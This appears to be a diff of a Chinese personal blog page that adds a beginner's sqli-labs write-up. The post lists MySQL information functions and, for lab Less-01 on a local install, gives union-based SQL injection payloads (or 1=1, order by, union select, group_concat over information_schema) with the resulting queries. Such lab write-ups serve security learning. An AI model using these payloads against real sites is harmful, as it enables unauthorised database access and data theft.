@@ -59,16 +59,17 @@
   };
 </script>
 
-  <meta name="description" content="用于平时的学习记录和个人阶段性总结">
-<meta property="og:type" content="website">
-<meta property="og:title" content="lemonl&#39;s Blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2020&#x2F;01&#x2F;index.html">
+  <meta name="description" content="MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入之sqli-labs">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;23&#x2F;SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs&#x2F;index.html">
 <meta property="og:site_name" content="lemonl&#39;s Blog">
-<meta property="og:description" content="用于平时的学习记录和个人阶段性总结">
+<meta property="og:description" content="MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-01-23T12:30:10.466Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/archives/2020/01/">
+<link rel="canonical" href="http://yoursite.com/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/">
 
 
 <script id="page-configurations">
@@ -76,13 +77,13 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false,
+    isPost: true,
     isPage: false,
-    isArchive: true
+    isArchive: false
   };
 </script>
 
-  <title>归档 | lemonl's Blog</title>
+  <title>SQL注入之sqli-labs | lemonl's Blog</title>
   
 
 
@@ -209,113 +210,150 @@
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="lemonl">
+      <meta itemprop="description" content="用于平时的学习记录和个人阶段性总结">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lemonl's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入之sqli-labs
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-23 20:21:05 / 修改时间：20:30:10" itemprop="dateCreated datePublished" datetime="2020-01-23T20:21:05+08:00">2020-01-23</time>
+            </span>
+
+          
   
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 7 篇日志。 继续努力。</span>
-      </div>
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h1 class="collection-header">2020</h1>
-    </div>
+        <p><font color="blue" size="5">MySQL简单基本用法</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用的几个函数：</span><br><span class="line">        system_user() —— 系统用户</span><br><span class="line">        user() —— 普通用户</span><br><span class="line">        current_user() —— 当前用户</span><br><span class="line">        database() —— 当前所用的数据库</span><br><span class="line">        version() —— 数据库的版本</span><br><span class="line">        @@datadir() —— 安装路径</span><br><span class="line">        @@version_compile_os —— 本机系统</span><br></pre></td></tr></table></figure><a id="more"></a>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-23T20:21:05+08:00"
-              content="2020-01-23">
-          01-23
-        </time>
-      </div>
+<p>假定：数据库名-security，表名-users</p>
+<ul>
+<li><p>查库：select schema_name from information_schema.schemata</p>
+</li>
+<li><p>查表：select table_name from information_schema.tables where table_schema=’security’</p>
+</li>
+<li><p>查列：select column_name from information_schema.columns where table_name=’users’</p>
+</li>
+<li><p>查字段： select username,password from security.users</p>
+</li>
+</ul>
+<h4 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h4><p>构造payload: <a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1</a></p>
+<p>得到 name:Dumb, password:Dumb</p>
+<p>—— 当然，可以改变后面id的值，会得到不同的name和password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. # 其中limit后面的第一位(0)表示从第几个开始，第二位表示显示多少个数据(1)</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">    得到的SQL语句为：select * from users where id=&apos;1&apos; limit 0,1 </span><br><span class="line"></span><br><span class="line">2. # A and B —— 当A和B都为1时，结果为true; A or B —— A、B任何一个为1，结果都为true</span><br><span class="line">   # --+  # -- 都表示注释符</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; or 1=1--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&apos;1&apos; or 1=1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">3. # orber by 表示对表中的某个字段进行排序</span><br><span class="line">   # 通过order by 语句可以确定数据列数，本题包含id在内有3个字段</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; order by 1--+</span><br><span class="line">    得到sql语句为：SELECT * FROM users WHERE id=&apos;1&apos; order by 1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">4. # 联合查询union的作用是将两个select查询结果和并</span><br><span class="line">   # 通过将id改为-1，判断显示的内容在数据库的第几列</span><br><span class="line">   # 得到login name在第2列，Password在第3列</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,3--+</span><br><span class="line">   得到sql语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">5. # 选3的位置作为回显位置，获取username或者password</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,schema_name from 	   information_schema.schemata limit 0,1--+</span><br><span class="line">   得到SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,schema_name from information_schema.schemata LIMIT 0,1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">6. # group_concat(),可以将所有的数据拼接在一行显示  		    </span><br><span class="line">   # 详情見本链接 https://www.yiibai.com/mysql/group_concat.html</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 0,1-- &apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
 
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/" itemprop="url">
-            <span itemprop="name">SQL注入之sqli-labs</span>
-          </a>
-      </h2>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-22T11:58:41+08:00"
-              content="2020-01-22">
-          01-22
-        </time>
-      </div>
-
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2020/01/22/sqli-labs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" itemprop="url">
-            <span itemprop="name">sqli-labs环境配置</span>
-          </a>
-      </h2>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-10T14:52:44+08:00"
-              content="2020-01-10">
-          01-10
-        </time>
-      </div>
-
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2020/01/10/ctf%E4%B8%8EPHP%E5%8D%83%E4%B8%9D%E4%B8%87%E7%BC%95%E7%9A%84%E8%81%94%E7%B3%BB/" itemprop="url">
-            <span itemprop="name">ctf与PHP千丝万缕的联系</span>
-          </a>
-      </h2>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-01-08T15:57:49+08:00"
-              content="2020-01-08">
-          01-08
-        </time>
-      </div>
-
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2020/01/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/" itemprop="url">
-            <span itemprop="name">文件上传绕过</span>
-          </a>
-      </h2>
-
-    </header>
-  </article>
-
+<h4 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h4><hr>
+<p><font color="red" size="5">未完待续<del>~</del></font></p>
+<hr>
 
     </div>
+
+    
+    
+    
+      <div>
+      
+        
+      
+      </div>
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------本文结束<i class="fa fa-heart"></i>感谢阅读----------------</div>
+    
+</div>
+
+        
+      </div>
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/01/22/sqli-labs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="next" title="sqli-labs环境配置">
+                  <i class="fa fa-chevron-left"></i> sqli-labs环境配置
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
           
+    <div class="comments" id="comments"></div>
 
         </div>
           
@@ -340,6 +378,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-01"><span class="nav-number">1.</span> <span class="nav-text">Less-01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-02"><span class="nav-number">2.</span> <span class="nav-text">Less-02</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
